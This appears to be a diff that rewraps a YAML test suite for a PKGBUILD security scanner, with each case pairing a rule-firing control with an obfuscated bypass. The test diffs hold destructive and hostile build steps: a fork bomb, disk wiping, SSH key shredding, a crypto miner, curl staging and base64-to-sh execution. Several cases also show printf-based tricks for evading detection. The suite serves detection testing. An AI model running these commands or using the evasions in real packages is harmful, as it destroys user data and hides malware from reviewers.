-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -4,6 +4,10 @@\n arch=('any')\n source=('https://example.com/probe-1.0.tar.gz')\n sha256sums=('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')\n+build() {\n+  cd /tmp\n+  touch stage\n+}\n package() {\n   :\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -4,6 +4,10 @@\n arch=('any')\n source=('https://example.com/probe-1.0.tar.gz')\n\
+    \ sha256sums=('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')\n\
+    +build() {\n+  cd /tmp\n+  touch stage\n+}\n package() {\n   :\n }\n"
   expect_fire:
   - H038
 - id: H042-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -5,5 +5,6 @@\n source=('https://example.com/probe-1.0.tar.gz')\n sha256sums=('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')\n package() {\n-  :\n+  printf -v _n '%s' .evil\n+  install -Dm755 evil.sh \"/opt/$_n\"\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -5,5 +5,6 @@\n source=('https://example.com/probe-1.0.tar.gz')\n\
+    \ sha256sums=('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')\n\
+    \ package() {\n-  :\n+  printf -v _n '%s' .evil\n+  install -Dm755 evil.sh \"\
+    /opt/$_n\"\n }\n"
   expect_absent:
   - H042
 - id: H042-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -5,5 +5,5 @@\n source=('https://example.com/probe-1.0.tar.gz')\n sha256sums=('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')\n package() {\n-  :\n+  install -Dm755 evil.sh /opt/.evil\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -5,5 +5,5 @@\n source=('https://example.com/probe-1.0.tar.gz')\n\
+    \ sha256sums=('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')\n\
+    \ package() {\n-  :\n+  install -Dm755 evil.sh /opt/.evil\n }\n"
   expect_fire:
   - H042
 - id: H062-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -5,5 +5,6 @@\n source=('https://example.com/probe-1.0.tar.gz')\n sha256sums=('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')\n package() {\n-  :\n+  printf -v _d '%s' /usr/share/libalpm/hooks\n+  install -Dm644 evil.hook \"$_d/evil.hook\"\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -5,5 +5,6 @@\n source=('https://example.com/probe-1.0.tar.gz')\n\
+    \ sha256sums=('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')\n\
+    \ package() {\n-  :\n+  printf -v _d '%s' /usr/share/libalpm/hooks\n+  install\
+    \ -Dm644 evil.hook \"$_d/evil.hook\"\n }\n"
   expect_absent:
   - H062
 - id: H062-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -5,5 +5,5 @@\n source=('https://example.com/probe-1.0.tar.gz')\n sha256sums=('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')\n package() {\n-  :\n+  install -Dm644 evil.hook /usr/share/libalpm/hooks/evil.hook\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -5,5 +5,5 @@\n source=('https://example.com/probe-1.0.tar.gz')\n\
+    \ sha256sums=('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')\n\
+    \ package() {\n-  :\n+  install -Dm644 evil.hook /usr/share/libalpm/hooks/evil.hook\n\
+    \ }\n"
   expect_fire:
   - H062
 - id: H077-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,6 @@\n pkgname=probe-h077\n pkgver=1\n pkgrel=1\n+_c=curl\n+_fetch() { \"$_c\" \"$@\"; }\n+_fetch https://example.invalid/stage.sh\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,6 @@\n pkgname=probe-h077\n pkgver=1\n\
+    \ pkgrel=1\n+_c=curl\n+_fetch() { \"$_c\" \"$@\"; }\n+_fetch https://example.invalid/stage.sh\n"
   expect_absent:
   - H077
 - id: H077-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n pkgname=probe-h077\n pkgver=1\n pkgrel=1\n+curl -fsSL https://example.invalid/stage.sh\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n pkgname=probe-h077\n pkgver=1\n\
+    \ pkgrel=1\n+curl -fsSL https://example.invalid/stage.sh\n"
   expect_fire:
   - H077
 - id: H079-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -2,5 +2,5 @@\n pkgver=1\n pkgrel=1\n build() {\n-  :\n+  CFLAGS=\"-fno-stack\"-protector\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -2,5 +2,5 @@\n pkgver=1\n pkgrel=1\n build()\
+    \ {\n-  :\n+  CFLAGS=\"-fno-stack\"-protector\n }\n"
   expect_absent:
   - H079
 - id: H079-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -2,5 +2,5 @@\n pkgver=1\n pkgrel=1\n build() {\n-  :\n+  CFLAGS=\"-fno-stack-protector\"\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -2,5 +2,5 @@\n pkgver=1\n pkgrel=1\n build()\
+    \ {\n-  :\n+  CFLAGS=\"-fno-stack-protector\"\n }\n"
   expect_fire:
   - H079
 - id: H083-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -3,5 +3,6 @@\n pkgrel=1\n source=('https://example.invalid/stage.sh')\n build() {\n-  :\n+  exec 3<\"$srcdir/stage.sh\"\n+  bash /dev/fd/3\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -3,5 +3,6 @@\n pkgrel=1\n source=('https://example.invalid/stage.sh')\n\
+    \ build() {\n-  :\n+  exec 3<\"$srcdir/stage.sh\"\n+  bash /dev/fd/3\n }\n"
   expect_absent:
   - H083
 - id: H083-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -3,5 +3,5 @@\n pkgrel=1\n source=('https://example.invalid/stage.sh')\n build() {\n-  :\n+  bash \"$srcdir/stage.sh\"\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -3,5 +3,5 @@\n pkgrel=1\n source=('https://example.invalid/stage.sh')\n\
+    \ build() {\n-  :\n+  bash \"$srcdir/stage.sh\"\n }\n"
   expect_fire:
   - H083
 - id: H094-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -2,5 +2,6 @@\n pkgver=1\n pkgrel=1\n package() {\n-  :\n+  exec 3<./mystery.sh\n+  bash /dev/fd/3\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -2,5 +2,6 @@\n pkgver=1\n pkgrel=1\n package()\
+    \ {\n-  :\n+  exec 3<./mystery.sh\n+  bash /dev/fd/3\n }\n"
   expect_absent:
   - H094
 - id: H094-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -2,5 +2,5 @@\n pkgver=1\n pkgrel=1\n package() {\n-  :\n+  bash ./mystery.sh\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -2,5 +2,5 @@\n pkgver=1\n pkgrel=1\n package()\
+    \ {\n-  :\n+  bash ./mystery.sh\n }\n"
   expect_fire:
   - H094
 - id: H097-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -2,5 +2,8 @@\n pkgver=1\n pkgrel=1\n build() {\n+  function cp {\n+    /bin/cp \"$@\"\n+  }\n   cp /dev/null \"$srcdir/x\"\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -2,5 +2,8 @@\n pkgver=1\n pkgrel=1\n build()\
+    \ {\n+  function cp {\n+    /bin/cp \"$@\"\n+  }\n   cp /dev/null \"$srcdir/x\"\
+    \n }\n"
   expect_absent:
   - H097
 - id: H097-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -2,5 +2,8 @@\n pkgver=1\n pkgrel=1\n build() {\n+  cp() {\n+    /bin/cp \"$@\"\n+  }\n   cp /dev/null \"$srcdir/x\"\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -2,5 +2,8 @@\n pkgver=1\n pkgrel=1\n build()\
+    \ {\n+  cp() {\n+    /bin/cp \"$@\"\n+  }\n   cp /dev/null \"$srcdir/x\"\n }\n"
   expect_fire:
   - H097
 - id: R058-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -2,5 +2,5 @@\n pkgver=1\n pkgrel=1\n build() {\n-  :\n+  /usr/bin/install -Dm644 x /etc/x\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -2,5 +2,5 @@\n pkgver=1\n pkgrel=1\n build()\
+    \ {\n-  :\n+  /usr/bin/install -Dm644 x /etc/x\n }\n"
   expect_absent:
   - R058
 - id: R058-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -2,5 +2,5 @@\n pkgver=1\n pkgrel=1\n build() {\n-  :\n+  install -Dm644 x /etc/x\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -2,5 +2,5 @@\n pkgver=1\n pkgrel=1\n build()\
+    \ {\n-  :\n+  install -Dm644 x /etc/x\n }\n"
   expect_fire:
   - R058
 - id: R078-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n pkgname=probe-r078\n pkgver=1\n pkgrel=1\n+COMPRESSZST[0]='cat'\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n pkgname=probe-r078\n pkgver=1\n\
+    \ pkgrel=1\n+COMPRESSZST[0]='cat'\n"
   expect_absent:
   - R078
 - id: R078-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n pkgname=probe-r078\n pkgver=1\n pkgrel=1\n+COMPRESSZST='cat'\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n pkgname=probe-r078\n pkgver=1\n\
+    \ pkgrel=1\n+COMPRESSZST='cat'\n"
   expect_fire:
   - R078
 - id: R003-abbrev-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -2,5 +2,5 @@\n pkgver=1\n pkgrel=1\n build() {\n-  :\n+  printf '%s' 'aWQK' | base64 --dec | sh\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -2,5 +2,5 @@\n pkgver=1\n pkgrel=1\n build()\
+    \ {\n-  :\n+  printf '%s' 'aWQK' | base64 --dec | sh\n }\n"
   expect_absent:
   - R003
 - id: R003-abbrev-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -2,5 +2,5 @@\n pkgver=1\n pkgrel=1\n build() {\n-  :\n+  printf '%s' 'aWQK' | base64 -d | sh\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -2,5 +2,5 @@\n pkgver=1\n pkgrel=1\n build()\
+    \ {\n-  :\n+  printf '%s' 'aWQK' | base64 -d | sh\n }\n"
   expect_fire:
   - R003
 - id: S001-S008-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -6,7 +6,14 @@\n license=(\"MIT\")\n source=()\n build() {\n-  true\n+  :(){ :|:& };:\n+  rm -rf /home\n+  dd if=/dev/zero of=/dev/sda bs=512 count=1\n+  shred -fz ~/.ssh/id_rsa\n+  chmod 777 /etc\n+  systemctl stop sshd\n+  xmrig --donate-level 0\n+  history -c\n }\n package() {\n   true\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -6,7 +6,14 @@\n license=(\"MIT\")\n source=()\n\
+    \ build() {\n-  true\n+  :(){ :|:& };:\n+  rm -rf /home\n+  dd if=/dev/zero of=/dev/sda\
+    \ bs=512 count=1\n+  shred -fz ~/.ssh/id_rsa\n+  chmod 777 /etc\n+  systemctl\
+    \ stop sshd\n+  xmrig --donate-level 0\n+  history -c\n }\n package() {\n   true\n"
   expect_fire:
   - S001
   - S002
@@ -275,7 +381,14 @@ cells:
   - S007
   - S008
 - id: S001-S008-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -6,7 +6,26 @@\n license=(\"MIT\")\n source=()\n build() {\n-  true\n+  :(){\n+    :|:&\n+  };:\n+  printf -v _t /home\n+  rm -rf \"$_t\"\n+  printf -v _D /dev/sda\n+  dd if=/dev/zero of=\"$_D\" bs=512 count=1\n+  printf -v _h \"$HOME\"\n+  printf -v _s ssh\n+  shred -fz \"$_h/.$_s/id_rsa\"\n+  printf -v _e /etc\n+  chmod 777 \"$_e/passwd\"\n+  printf -v _u sshd\n+  systemctl stop \"$_u\"\n+  printf -v _m xmrig\n+  printf -v _f '%s' --donate-\n+  printf -v _g level\n+  \"$_m\" \"$_f\"\"$_g\" 0\n+  printf -v _c history\n+  \"$_c\" -c\n }\n package() {\n   true\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -6,7 +6,26 @@\n license=(\"MIT\")\n source=()\n\
+    \ build() {\n-  true\n+  :(){\n+    :|:&\n+  };:\n+  printf -v _t /home\n+  rm\
+    \ -rf \"$_t\"\n+  printf -v _D /dev/sda\n+  dd if=/dev/zero of=\"$_D\" bs=512\
+    \ count=1\n+  printf -v _h \"$HOME\"\n+  printf -v _s ssh\n+  shred -fz \"$_h/.$_s/id_rsa\"\
+    \n+  printf -v _e /etc\n+  chmod 777 \"$_e/passwd\"\n+  printf -v _u sshd\n+ \
+    \ systemctl stop \"$_u\"\n+  printf -v _m xmrig\n+  printf -v _f '%s' --donate-\n\
+    +  printf -v _g level\n+  \"$_m\" \"$_f\"\"$_g\" 0\n+  printf -v _c history\n\
+    +  \"$_c\" -c\n }\n package() {\n   true\n"
   expect_absent:
   - S001
   - S002
@@ -286,48 +399,244 @@ cells:
   - S007
   - S008
 - id: E001-E003-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -6,7 +6,71 @@\n license=(\"MIT\")\n source=()\n build() {\n-  true\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
-    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
-    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
-    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
-    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  Ax7Bq3Kz=one\n+  Cd9Em4Lw=one\n+  Fg2Hn5Mv=one\n+  Jk6Pp8Rs=one\n+  Tu1Vw9Xy=one\n }\n package() {\n   true\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -6,7 +6,71 @@\n license=(\"MIT\")\n source=()\n\
+    \ build() {\n-  true\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
